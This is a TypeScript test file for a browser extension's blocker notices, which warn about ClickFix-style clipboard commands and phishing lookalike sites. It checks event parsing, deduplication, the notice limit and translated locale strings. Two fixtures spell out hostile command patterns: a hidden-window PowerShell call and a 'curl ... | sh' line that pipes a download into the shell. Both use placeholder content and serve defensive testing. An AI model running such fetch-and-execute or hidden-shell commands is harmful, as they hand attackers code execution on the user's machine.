// Tests for the blocker notices' pure part (src/content/notice-model.ts):
// the uBO event detail, dedupe and the stack
// limit; plus the notice* locale keys used by src/content/notice.ts.
//
// Fixtures are assembled from pieces (x(...)) so the file holds no command
// line verbatim (antivirus engines flag such files).
//
// SPDX-License-Identifier: GPL-3.0-or-later

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { clipKey, Deduper, DEDUPE_MS, MAX_NOTICE_TEXT, MAX_NOTICES, overflow, parseUboDetail } from '../../src/content/notice-model.ts';

const x = (...parts: string[]) => parts.join('');
const HIGH = x('power', 'shell -w hid', 'den -c "Write-Output test"');
const MEDIUM = x('curl -fsSL https://example.invalid/i.sh | ', 'sh');

test('uBO event detail: only "ubo|<text>" with non-blank text, capped', () => {
  assert.equal(parseUboDetail('ubo|hello'), 'hello');
  assert.equal(parseUboDetail('ubo|  '), null);
  assert.equal(parseUboDetail('ubo|'), null);
  assert.equal(parseUboDetail('c|writeText|0|x'), null);
  assert.equal(parseUboDetail(null), null);
  assert.equal(parseUboDetail({ text: 'x' }), null);
  assert.equal(parseUboDetail('ubo|' + 'a'.repeat(MAX_NOTICE_TEXT + 50))?.length, MAX_NOTICE_TEXT);
});

test('identical text within the dedupe window gives one notice, from either source', () => {
  const d = new Deduper();
  const t0 = 1_000_000;
  assert.equal(d.seen(clipKey(MEDIUM), t0), false);
  assert.equal(d.seen(clipKey(`  ${MEDIUM}\n`), t0 + 500), true, 'whitespace differences do not matter');
  assert.equal(d.seen(clipKey(HIGH), t0 + 600), false, 'other text');
  assert.equal(d.seen(clipKey(MEDIUM), t0 + DEDUPE_MS + 1), false, 'after the window');
});

test('at most MAX_NOTICES stay: the oldest goes when a new one arrives', () => {
  assert.equal(MAX_NOTICES, 3);
  assert.equal(overflow(0), 0);
  assert.equal(overflow(2), 0);
  assert.equal(overflow(3), 1);
  assert.equal(overflow(5), 3);
});

test('notice locale keys exist in every language, Swiss spelling in German, none unused', () => {
  const load = (lang: string) =>
    JSON.parse(readFileSync(new URL(`../../src/_locales/${lang}/messages.json`, import.meta.url), 'utf8')) as Record<string, { message: string; placeholders?: object }>;
  const de = load('de');
  const keys = Object.keys(de).filter((k) => k.startsWith('notice'));
  assert.ok(keys.length >= 15);
  for (const k of keys) assert.ok(!de[k]!.message.includes('ß'), `${k}: no sharp s in de-CH`);
  for (const lang of ['en', 'fr', 'it']) {
    const other = load(lang);
    assert.deepEqual(Object.keys(other).filter((k) => k.startsWith('notice')).sort(), [...keys].sort(), `${lang}: same notice keys`);
    for (const k of keys) assert.deepEqual(Object.keys(other[k]!.placeholders ?? {}), Object.keys(de[k]!.placeholders ?? {}), `${lang}: ${k} placeholders`);
  }
  const src = readFileSync(new URL('../../src/content/notice.ts', import.meta.url), 'utf8');
  for (const k of keys) assert.ok(src.includes(`'${k}'`) || src.includes(`${k}:`), `unused ${k}`);
  for (const m of src.matchAll(/'(notice[A-Z][A-Za-z]*)'/g)) assert.ok(de[m[1]!], `missing ${m[1]}`);
  // Product terms stay in English.
  assert.match(de.noticeClipTitle!.message, /ClickFix/);
  assert.match(de.noticeLookalikeTitle!.message, /Phishing/);
  // No override button: the notice only explains how to copy by hand.
  for (const lang of ['de', 'en', 'fr', 'it']) assert.ok(!Object.keys(load(lang)).includes('noticeClipCopyAnyway'), `${lang}: no copy-anyway string`);
});
